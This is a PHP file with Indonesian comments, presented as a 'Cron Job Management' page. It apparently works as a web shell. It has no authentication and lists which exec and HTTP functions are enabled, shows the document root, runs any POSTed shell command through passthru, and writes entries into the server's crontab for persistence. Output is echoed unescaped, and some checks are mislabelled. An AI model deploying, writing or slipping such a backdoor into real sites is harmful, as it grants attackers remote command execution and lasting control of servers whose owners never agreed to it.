<?php
// Fungsi untuk memeriksa status fungsi PHP
function checkFunctionStatus($function) {
    return (function_exists($function) && is_callable($function)) ? 'ON' : 'OFF';
}

// Fungsi untuk mengeksekusi perintah shell
$shellOutput = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['shell_command'])) {
    $command = escapeshellcmd($_POST['shell_command']);
    ob_start();
    passthru($command, $return_var);
    $shellOutput = ob_get_clean();
    $result = $return_var === 0 ? "Command executed successfully." : "Command failed with exit code $return_var";
}

// Fungsi untuk menambahkan cron job ke crontab
$cronResult = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cron_command']) && isset($_POST['cron_time'])) {
    $cronCommand = escapeshellcmd($_POST['cron_command']);
    $cronTime = escapeshellarg($_POST['cron_time']); // Mengamankan input untuk shell
    $fullCommand = "php " . __FILE__ . " " . $cronCommand; // Asumsi script ini dijalankan oleh PHP
    $crontabEntry = "$cronTime $fullCommand";

    // Tambahkan ke crontab
    $output = [];
    $return_var = 0;
    exec("echo '$crontabEntry' | crontab -", $output, $return_var);
    if ($return_var === 0) {
        $cronResult = "Cron job added successfully to crontab.";
    } else {
        $cronResult = "Failed to add cron job to crontab.";
    }
} elseif ($_SERVER['REQUEST_METHOD'] === 'POST' && (!isset($_POST['cron_command']) || !isset($_POST['cron_time']))) {
    $cronResult = "Please fill in both cron time and command.";
}

// Fungsi untuk menghapus cron job dari crontab
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_cron']) && is_numeric($_POST['delete_cron'])) {
    $index = (int)$_POST['delete_cron'];
    $cronJobs = shell_exec('crontab -l 2>/dev/null');
    $cronJobs = explode("\n", trim($cronJobs));
    if (isset($cronJobs[$index])) {
        unset($cronJobs[$index]);
        $tempFile = tempnam(sys_get_temp_dir(), 'crontab');
        file_put_contents($tempFile, implode("\n", $cronJobs));
        exec("crontab $tempFile", $output, $return_var);
        unlink($tempFile);
        if ($return_var === 0) {
            $cronResult = "Cron job deleted successfully from crontab.";
        } else {
            $cronResult = "Failed to delete cron job from crontab.";
        }
    } else {
        $cronResult = "Cron job not found.";
    }
}

// Baca cron jobs yang ada dari crontab
$cronJobs = shell_exec('crontab -l 2>/dev/null');
$cronJobs = explode("\n", trim($cronJobs));
$cronJobs = array_filter($cronJobs); // Hapus baris kosong

$documentRoot = $_SERVER['DOCUMENT_ROOT'];
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Cron Job Management</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
        .container { width: 80%; margin: 20px auto; background: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h2 { color: #333; }
        h3 { color: #555; margin-top: 20px; }
        .status { color: green; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; }
        input[type="text"], select { width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { background: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #45a049; }
        .output { background: #f9f9f9; padding: 10px; border: 1px solid #ddd; border-radius: 4px; white-space: pre-wrap; margin-top: 10px; color: #333; }
        .error { background: #ffebee; padding: 10px; border: 1px solid #ffcdd2; border-radius: 4px; color: #c62828; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        table, th, td { border: 1px solid #ddd; }
        th, td { padding: 8px; text-align: left; }
        th { background: #4CAF50; color: white; }
        tr:nth-child(even) { background: #f2f2f2; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Cron Job Management</h2>

        <h3>PHP Exec Functions Status</h3>
        <p>system: <span class="status"><?php echo checkFunctionStatus('system'); ?></span></p>
        <p>exec: <span class="status"><?php echo checkFunctionStatus('exec'); ?></span></p>
        <p>passthru: <span class="status"><?php echo checkFunctionStatus('passthru'); ?></span></p>
        <p>shell_exec: <span class="status"><?php echo checkFunctionStatus('shell_exec'); ?></span></p>

        <h3>PHP HTTP Request Functions Status</h3>
        <p>wget: <span class="status"><?php echo checkFunctionStatus('exec') ? 'ON' : 'OFF'; ?></span></p>
        <p>curl: <span class="status"><?php echo checkFunctionStatus('curl_exec') ? 'ON' : 'OFF'; ?></span></p>

        <p>Document Root</p>
        <p><?php echo htmlspecialchars($documentRoot); ?></p>

        <h3>Execute a Shell Command</h3>
        <form method="post">
            <div class="form-group">
                <label for="shell_command">Enter Shell Command:</label>
                <input type="text" id="shell_command" name="shell_command" placeholder="e.g., ls -l">
            </div>
            <button type="submit">Execute Command</button>
            <?php if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['shell_command'])): ?>
                <?php if ($result) echo "<div class='output'>$result</div>"; ?>
                <?php if ($shellOutput) echo "<div class='output'>Output: $shellOutput</div>"; ?>
            <?php endif; ?>
        </form>

        <h3>Add New Cron Job</h3>
        <form method="post">
            <div class="form-group">
                <label for="cron_time">Select Cron Job Time:</label>
                <select id="cron_time" name="cron_time">
                    <option value="* * * * *">Every Minute</option>
                    <option value="0 * * * *">Every Hour</option>
                    <option value="0 0 * * *">Every Day</option>
                </select>
            </div>
            <div class="form-group">
                <label for="cron_command">Cron Job Command:</label>
                <input type="text" id="cron_command" name="cron_command" placeholder="e.g., echo 'hello'">
            </div>
            <button type="submit">Add Cron Job</button>
            <?php if (isset($cronResult)) {
                echo strpos($cronResult, 'failed') !== false ? "<div class='error'>$cronResult</div>" : "<div class='output'>$cronResult</div>";
            } ?>
        </form>

        <h3>Active Cron Jobs</h3>
        <form method="post">
            <table>
                <tr>
                    <th>No</th>
                    <th>Time</th>
                    <th>Command</th>
                    <th>Action</th>
                </tr>
                <?php
                $no = 0;
                foreach ($cronJobs as $index => $job) {
                    if (trim($job)) {
                        list($time, $command) = explode(' ', $job, 2);
                        echo "<tr><td>" . ($no + 1) . "</td><td>$time</td><td>$command</td><td><button type='submit' name='delete_cron' value='$index'>Delete</button></td></tr>";
                        $no++;
                    }
                }
                if (empty($cronJobs)) echo "<tr><td colspan='4'>No active cron jobs</td></tr>";
                ?>
            </table>
        </form>
    </div>
</body>
</html>